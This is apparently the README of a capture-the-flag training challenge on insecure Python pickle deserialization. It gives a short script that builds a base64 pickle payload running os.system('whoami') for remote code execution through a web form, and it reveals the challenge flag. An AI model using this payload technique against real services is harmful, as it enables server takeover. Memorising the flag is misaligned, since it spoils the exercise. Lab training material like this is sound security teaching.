# Anime

Simple CTF challenge to train exploiting insecure deserialization in python pickle lib.

## Description

In this task, you need to send malicious input to "Request anime form" to trigger insecure deserialization in python pickle lib. First of all, you need to create a payload, which can lead to RCE on the server. You can achieve this for example with this script:

```
import os
import pickle
import base64

class RCE:
    def __reduce__(self):
        cmd = (os.system, ('whoami',))
        return cmd

if __name__ == '__main__':
    pickled = pickle.dumps(RCE())
    print(base64.urlsafe_b64encode(pickled))
```

After running this script you will be prompted with base64 output, which you need to paste into the "Anime name" form field. Run any command that can be run on the linux server and you will get the flag.

> flag{d4ng3r0us_4n1m3}
